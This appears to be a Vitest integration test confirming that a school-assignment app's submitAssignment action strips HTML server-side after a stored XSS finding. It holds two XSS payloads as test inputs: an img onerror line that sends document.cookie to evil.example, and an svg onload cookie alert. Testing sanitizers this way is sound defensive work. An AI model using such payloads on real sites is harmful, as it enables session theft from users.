/**
 * Integration test for submitAssignment's server-side sanitization.
 *
 * submitAssignment must not persist raw HTML from a direct Server Action
 * call (bypassing the client-side RichTextarea sanitizer) — see the stored
 * XSS finding fixed alongside this test.
 */

import { describe, it, expect, vi } from 'vitest'
import { createMockDb } from '@/lib/__tests__/mocks/supabase'

const dbRef: { db: ReturnType<typeof createMockDb> | null } = { db: null }

vi.mock('@/lib/supabase/server', () => ({
  createServerClient: () => dbRef.db,
}))

// eslint-disable-next-line import/order
import { submitAssignment } from '@/app/actions/assignment'
// eslint-disable-next-line import/order
import { STUDENT_ID } from '@/lib/constants'

describe('submitAssignment', () => {
  it('sanitizes a malicious payload before persisting a new submission', async () => {
    dbRef.db = createMockDb({
      submissions: [],
    })

    const malicious = '<img src=x onerror="fetch(\'https://evil.example/steal?c=\'+document.cookie)">'
    const result = await submitAssignment('asgn-1', malicious)

    expect(result.error).toBeUndefined()
    const stored = dbRef.db!._store.submissions[0]
    expect(stored.body).not.toContain('onerror')
    expect(stored.body).not.toContain('evil.example')
  })

  it('sanitizes a malicious payload before persisting an update to a draft submission', async () => {
    dbRef.db = createMockDb({
      submissions: [
        { id: 'sub-1', assignment_id: 'asgn-1', student_id: STUDENT_ID, status: 'draft', body: 'draft text' },
      ],
    })

    const malicious = '<svg onload="alert(document.cookie)"></svg>'
    const result = await submitAssignment('asgn-1', malicious)

    expect(result.error).toBeUndefined()
    const stored = dbRef.db!._store.submissions.find((r) => r.id === 'sub-1')!
    expect(stored.body).not.toContain('onload')
  })

  it('preserves legitimate formatting content', async () => {
    dbRef.db = createMockDb({
      submissions: [],
    })

    const legit = '<p><strong>Hello</strong> world</p>'
    await submitAssignment('asgn-1', legit)

    const stored = dbRef.db!._store.submissions[0]
    expect(stored.body).toContain('<strong>Hello</strong>')
  })
})
